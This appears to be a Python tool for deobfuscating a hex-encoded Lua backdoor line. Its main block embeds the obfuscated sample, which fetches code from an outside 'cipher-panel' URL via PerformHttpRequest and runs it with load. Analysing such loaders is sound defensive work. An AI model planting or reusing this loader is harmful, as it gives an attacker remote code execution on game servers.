#!/bin/python3.11

import re
import random
from collections.abc import Generator


VAR_NAMES = [  # Just random names bc we the hell dont know what happens in that script
    "gg",
    "gyros",
    "fries",
    "rizz",
    "taco",
    "bell",
    "uber",
    "deez",
    "nuts",
    "hell",
    "towlie"
]

TABLE_REGEX = r"(\{([^{}]+)\})"
REGEX = [
    r"((local(\s+)?(\w+)))",
    r"(function\s*\(((\w+(,(\s?))?)*)\))",
]


def is_int(_str: str) -> int:
    try:
        int(_str)
    except ValueError:
        return 1
    return 0


def grap(ls: list) -> str:
    """ Get Random And Pop (grap)

    Parameters
    ----------
    ls : list
        Give the list from where you want a random value of.

    Returns
    -------
    str
        the popped string
    """

    f = random.choice(ls)
    ls.remove(f)
    return f


def do_regex(_line: str, regex: str) -> list:
    """ Do the regex template stuff
    
    Parameters
    ----------
    regex : str
        The regex to search for in _line

    Returns
    -------
    list
        The list with the found groups

    """
    return re.findall(regex, rf"{_line}", 
                      re.MULTILINE and re.IGNORECASE)


def do_list_addition(char_set: list) -> Generator:
    """ Does not directly adds stuff to the list BUT it yields content
    to create one

    Parameters
    ----------
    char_set : list
        Give a list to yield values from

    """
    for i in char_set:
       yield i[1].strip("local ").split(",")


def get_table_contents(line: str) -> list:
    _t = []
    
    for i in do_regex(line, TABLE_REGEX)[0][1].split(","):
        _t.append(i.strip())
    
    return _t


def de_obfs_code(_line: str, _ret: list) -> str:
    """ Trys to de De-Obfuscate the trigger line
    
    Returns
    -------
    str
        the decoded string
    """
    var = []
    names = []
    grap_names = VAR_NAMES

    for i in REGEX:
        if x := do_regex(_line, i): 
            for j in do_list_addition(x):
                var.extend(j)
    
    for i in var:
        name = grap(grap_names)
        names.append(name)
        _line = _line.replace(i.strip(), name)
    
    for v, t in de_obfs_char(_ret):
        _line = _line.replace(t.strip('"'), v)
    

    table = get_table_contents(_line)
    t_re = rf"({names[0]}\[\d+\])"
    omfg = set(do_regex(_line, t_re))

    for i, c in enumerate(sorted(omfg)):
        _line = _line.replace(c, table[i])

    return _line


def de_obfs_char(found: list) -> list: 
    """ De-Obfuscate the \x23... lines

    Parameters
    ----------
    found : list[tuple]
       Give the found lines.

    Returns
    -------
    list[tuple]
        Give the decoded lines back with the original version.

    """
    temp = []

    for j in found:
        t = ""
        # Get rid of the x and backslashes.
        for i in (j[0].strip('"').replace("\\", "")).split("x"):
            if i == "":
                continue

            t += chr(int(i, 16))
        temp.append((t, j[0]))
    return temp


def de_obfs(_ret: list, _line: str) -> str:
    return de_obfs_code(_line, _ret)


if __name__ == "__main__":
    ret = [('"\\x50\\x65\\x72\\x66\\x6f\\x72\\x6d\\x48\\x74\\x74\\x70\\x52\\x65\\x71\\x75\\x65\\x73\\x74"', '\\x74', '\\x', '74'), ('"\\x61\\x73\\x73\\x65\\x72\\x74"', '\\x74', '\\x', '74'), ('"\\x6c\\x6f\\x61\\x64"', '\\x64', '\\x', '64'), ('"\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x63\\x69\\x70\\x68\\x65\\x72\\x2d\\x70\\x61\\x6e\\x65\\x6c\\x2e\\x6d\\x65\\x2f\\x5f\\x69\\x2f\\x76\\x32\\x5f\\x2f\\x73\\x74\\x61\\x67\\x65\\x33\\x2e\\x70\\x68\\x70\\x3f\\x74\\x6f\\x3d\\x5a\\x43\\x73\\x4d\\x69\\x43"', '\\x43', '\\x', '43')]
    line = r'local JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x5a\x43\x73\x4d\x69\x43", function (NITGVQwpvzdWIEsIKRRTcnvXYZGcHqhpHEraydIxOKENUiiZyoncOhpShzLIkVUQJOoeqm, sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij) if (sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[6] or sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[5]) then return end JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[2]](JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[3]](sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij))() end)'
    de_obfs(ret, line)
